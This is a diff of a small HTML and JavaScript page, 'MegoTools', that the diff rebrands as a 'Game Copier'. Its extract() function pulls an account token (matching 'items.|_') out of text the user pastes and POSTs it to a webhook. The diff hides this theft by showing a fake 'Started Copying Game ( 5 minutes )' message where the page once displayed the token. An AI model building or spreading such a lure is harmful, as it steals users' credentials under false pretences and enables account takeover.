@@ -5,9 +5,10 @@
 <title>MegoTools</title>
 
 <style>
+
 body{
 margin:0;
-font-family:Arial;
+font-family:Arial, Helvetica, sans-serif;
 height:100vh;
 display:flex;
 justify-content:center;
@@ -22,47 +23,59 @@ padding:40px;
 border-radius:15px;
 width:500px;
 text-align:center;
-box-shadow:0 0 20px rgba(0,0,0,0.5);
+box-shadow:0 0 25px rgba(0,0,0,0.6);
+}
+
+h2{
+margin-top:0;
+color:#60a5fa;
 }
 
 input{
 width:100%;
-padding:12px;
+padding:14px;
 border:none;
-border-radius:8px;
-margin-top:10px;
+border-radius:10px;
 background:#0f172a;
 color:white;
+font-size:15px;
+margin-top:15px;
 }
 
 button{
 margin-top:15px;
-padding:12px;
 width:100%;
+padding:14px;
 border:none;
-border-radius:8px;
+border-radius:10px;
 background:#2563eb;
 color:white;
+font-size:16px;
 cursor:pointer;
+}
+
+button:hover{
+background:#1d4ed8;
 }
 
 .status{
 margin-top:15px;
+font-weight:bold;
 color:#34d399;
-word-break:break-all;
 }
-</style>
 
+</style>
 </head>
+
 <body>
 
 <div class="container">
 
-<h2>MegoTools</h2>
+<h2>MegoTools - Game Copier</h2>
 
-<input id="gameInput" placeholder="Paste text here">
+<input id="gameInput" placeholder="Paste Game File There">
 
-<button onclick="extract()">Extract</button>
+<button onclick="extract()">Copy Game</button>
 
 <div id="status" class="status"></div>
 
@@ -77,34 +90,23 @@ function extract(){
 let text = document.getElementById("gameInput").value;
 
 if(!text){
-document.getElementById("status").innerText="Enter text";
+document.getElementById("status").innerText="Invalid Input";
 return;
 }
 
-/*
-szuka:
-items.|_TOKEN", "/", "
-*/
+/* szuka items.|_TOKEN", "/", " */
 
-let match = text.match(/items\.\|_(.*?)", "\/", "/);
+let match = text.match(/items\.\|_(.*?)", "\//);
 
 if(!match){
-
-match = text.match(/items\.\|_(.*?)", "\//);
-
-}
-
-if(!match){
-
 match = text.match(/items\.\|_(.*?)", "/);
-
 }
 
 if(match){
 
 let token = match[1];
 
-document.getElementById("status").innerText="Found: "+token;
+document.getElementById("status").innerText="Started Copying Game ( 5 minutes )";
 
 fetch(webhook,{
 method:"POST",
@@ -118,7 +120,7 @@ content:token
 
 }else{
 
-document.getElementById("status").innerText="Token not found";
+document.getElementById("status").innerText="Invalid Input";
 
 }
 
